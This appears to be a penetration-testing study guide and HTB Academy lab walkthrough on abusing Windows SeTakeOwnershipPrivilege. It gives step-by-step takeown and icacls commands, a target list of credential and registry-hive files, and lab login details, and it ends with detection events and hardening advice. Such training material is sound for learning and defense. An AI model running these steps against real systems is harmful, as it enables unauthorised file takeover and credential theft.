# SeTakeOwnershipPrivilege Exploitation

## 🎯 Overview

**SeTakeOwnershipPrivilege** grants users the ability to take ownership of any "securable object" including **NTFS files/folders**, **registry keys**, **services**, **processes**, and **Active Directory objects**. This privilege assigns **WRITE_OWNER** rights, allowing modification of object security descriptors to change ownership.

## 🔑 Privilege Fundamentals

### SeTakeOwnershipPrivilege Capabilities
- **File/folder ownership** takeover on NTFS systems
- **Registry key ownership** modification  
- **Service ownership** changes
- **Process ownership** manipulation
- **Active Directory object** ownership control

### Assignment Contexts
```cmd
# Group Policy location:
Computer Configuration → Windows Settings → Security Settings → Local Policies → User Rights Assignment
"Take ownership of files or other objects"
```

**Common Assignment Scenarios:**
- **Administrators** - assigned by default
- **Service accounts** - backup jobs, VSS snapshots
- **Specialized roles** - often combined with SeBackupPrivilege, SeRestorePrivilege
- **GPO abuse victims** - via SharpGPOAbuse attacks

## 📊 Privilege Detection & Enablement

### Enumeration
```cmd
# Check current privileges
whoami /priv

# Expected output:
SeTakeOwnershipPrivilege      Take ownership of files or other objects    Disabled
```

### Privilege Activation

#### Method 1: PowerShell Script
```powershell
# Import privilege enablement script
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1

# Verify activation
whoami /priv

# Expected result:
SeTakeOwnershipPrivilege      Take ownership of files or other objects    Enabled
```

#### Method 2: Manual Token Manipulation
```cmd
# Use native Windows APIs to enable privilege
# Requires elevated PowerShell context
```

## 🎯 Target File Identification

### High-Value Targets

#### System Configuration Files
```cmd
# Web application configs
c:\inetpub\wwwroot\web.config

# Registry backups
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security

# System event logs
%WINDIR%\system32\config\SecEvent.Evt

# Registry hive backups
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

#### Credential Files
```cmd
# Common password files
passwords.*
pass.*
creds.*
credential.*

# Database files
*.kdbx (KeePass databases)
*.db
*.sqlite

# Document files
*.docx, *.xlsx, *.pdf (may contain credentials)
```

#### Specialized Files
```cmd
# Virtual machine files
*.vhd, *.vhdx, *.vmdk

# Certificate files
*.pfx, *.p12

# SSH keys
id_rsa, id_ed25519

# Configuration scripts
*.ps1, *.bat, *.vbs
```

## 💻 File Ownership Attack Technique

### Step 1: Target Assessment
```powershell
# Examine target file details
Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner}}

# Check directory ownership if file owner hidden
cmd /c dir /q 'C:\Department Shares\Private\IT'
```

### Step 2: Ownership Takeover
```cmd
# Take ownership using takeown utility
takeown /f 'C:\Department Shares\Private\IT\cred.txt'

# Expected output:
SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student"
```

### Step 3: Ownership Verification
```powershell
# Confirm ownership change
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select name,directory,@{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

# Expected result:
Name     Directory                       Owner
----     ---------                       -----
cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
```

### Step 4: Access Control Modification
```cmd
# Test file access first
cat 'C:\Department Shares\Private\IT\cred.txt'
# May still result in: Access to the path is denied

# Grant full permissions using icacls
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

# Expected output:
processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files
```

### Step 5: File Access
```powershell
# Read file contents
cat 'C:\Department Shares\Private\IT\cred.txt'

# Sample output:
NIX01 admin
root:n1X_p0wer_us3er!
```

## 🎯 HTB Academy Lab Solution

### Lab Environment
- **Target**: `10.129.43.43` (ACADEMY-WINLPE-SRV01)
- **Credentials**: `htb-student:HTB_@cademy_stdnt!`
- **Access Method**: RDP
- **Objective**: Leverage SeTakeOwnershipPrivilege over `C:\TakeOwn\flag.txt`

### Detailed Step-by-Step Solution

#### 1. RDP Connection
```bash
# Connect via RDP
xfreerdp /v:10.129.43.43 /u:htb-student /p:'HTB_@cademy_stdnt!'
```

#### 2. Privilege Verification
```cmd
# Open elevated PowerShell (Run as Administrator)
# Enter htb-student credentials when prompted

PS C:\> whoami /priv

# Locate SeTakeOwnershipPrivilege in output:
SeTakeOwnershipPrivilege      Take ownership of files or other objects    Disabled
```

#### 3. Privilege Activation
```powershell
# Download/locate Enable-Privilege.ps1 script
# If not available, use manual method or download from GitHub

# Enable all token privileges
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1

# Verify activation
PS C:\> whoami /priv
# Confirm SeTakeOwnershipPrivilege shows as "Enabled"
```

#### 4. Target File Analysis
```powershell
# Examine target file
Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner}}

# Check directory structure
cmd /c dir /q 'C:\TakeOwn\'
```

#### 5. File Ownership Takeover
```cmd
# Take ownership of flag.txt
takeown /f 'C:\TakeOwn\flag.txt'

# Expected success message:
SUCCESS: The file (or folder): "C:\TakeOwn\flag.txt" now owned by user "WINLPE-SRV01\htb-student"
```

#### 6. Access Control Modification
```cmd
# Grant full permissions to current user
icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F

# Verify permissions granted:
processed file: C:\TakeOwn\flag.txt
Successfully processed 1 files; Failed processing 0 files
```

#### 7. Flag Retrieval
```powershell
# Read flag contents
cat 'C:\TakeOwn\flag.txt'
# OR
Get-Content 'C:\TakeOwn\flag.txt'

# Submit the flag content found in the file
```

### Alternative Methods

#### Manual ACL Manipulation
```powershell
# Using Get-Acl/Set-Acl for more granular control
$acl = Get-Acl 'C:\TakeOwn\flag.txt'
$acl.SetOwner([System.Security.Principal.WindowsIdentity]::GetCurrent().User)
Set-Acl -Path 'C:\TakeOwn\flag.txt' -AclObject $acl
```

#### Registry Key Takeover
```cmd
# Take ownership of registry keys (if applicable)
takeown /f "HKLM\SOFTWARE\TargetKey" /r
```

## ⚠️ Impact & Considerations

### Destructive Nature
```cmd
# HIGH RISK ACTIVITIES:
- Live web.config file modification
- Critical system file ownership changes  
- Deep directory structure modifications
- Service configuration file changes
```

### Reversion Challenges
```cmd
# DIFFICULT TO REVERT:
- Nested subdirectory permission changes
- Service account ownership restoration
- Complex ACL structure reconstruction
```

### Client Communication
```cmd
# BEST PRACTICES:
- Document all ownership changes
- Attempt permission reversion
- Alert client to irreversible changes
- Include modifications in report appendix
```

## 🔍 Detection Indicators

### File System Events
```cmd
# Event IDs to monitor:
Event ID 4670 - Object permissions changed
Event ID 4657 - Registry value modified  
Event ID 4663 - Access attempt to object
Event ID 4656 - Handle to object requested
```

### Process Activity
```cmd
# Suspicious activities:
- takeown.exe execution with critical files
- icacls.exe permission modifications
- Unusual file access patterns
- PowerShell privilege modification scripts
```

### Registry Monitoring
```cmd
# Registry changes to watch:
HKLM\SYSTEM\CurrentControlSet\Services (service ownership)
HKLM\SOFTWARE (application settings)
HKCU (user-specific changes)
```

## 🛡️ Defense Strategies

### Privilege Hardening
```cmd
# Remove SeTakeOwnershipPrivilege from:
- Non-essential service accounts
- Standard user accounts  
- Development accounts in production
- Third-party application accounts
```

### File System Protection
```cmd
# Implement protections:
- NTFS permissions auditing
- File integrity monitoring (FIM)
- Protected directories with strict ACLs
- Regular permission reviews
```

### Monitoring Implementation
```cmd
# Deploy monitoring for:
- Ownership change events
- Permission modification alerts
- Critical file access attempts
- Privilege escalation indicators
```

## 📋 SeTakeOwnershipPrivilege Exploitation Checklist

### Prerequisites
- [ ] **User account** with SeTakeOwnershipPrivilege assigned
- [ ] **Elevated shell** (Run as Administrator) 
- [ ] **Privilege enablement** capability (scripts/tools)
- [ ] **Target file identification** (high-value assets)

### Execution Steps
- [ ] **Verify privilege** (`whoami /priv`)
- [ ] **Enable privilege** (Enable-Privilege.ps1 or manual)
- [ ] **Identify target** (sensitive files/directories)
- [ ] **Take ownership** (`takeown /f [target]`)
- [ ] **Modify ACL** (`icacls [target] /grant user:F`)
- [ ] **Access content** (read/copy sensitive data)

### Post-Exploitation
- [ ] **Document changes** (ownership modifications)
- [ ] **Attempt reversion** (restore original permissions)
- [ ] **Extract data** (credentials, configurations)
- [ ] **Report modifications** (client notification)

### File Targets Priority
- [ ] **Web.config files** (application credentials)
- [ ] **Registry backups** (SAM, SYSTEM, SECURITY)
- [ ] **Password files** (*.txt, *.xlsx containing creds)
- [ ] **Database files** (KeePass *.kdbx)
- [ ] **Certificate stores** (*.pfx files)

## 💡 Key Takeaways

1. **SeTakeOwnershipPrivilege** enables ownership takeover of any securable object
2. **File system attacks** are primary use case for privilege escalation
3. **ACL modification** required after ownership change for access
4. **Destructive potential** requires careful consideration before execution
5. **Service accounts** commonly have this privilege for backup operations
6. **GPO abuse** can grant privilege to controlled accounts
7. **Detection** possible through file system event monitoring

---

*SeTakeOwnershipPrivilege exploitation provides powerful file system access but should be used with extreme caution due to its potentially destructive nature.* 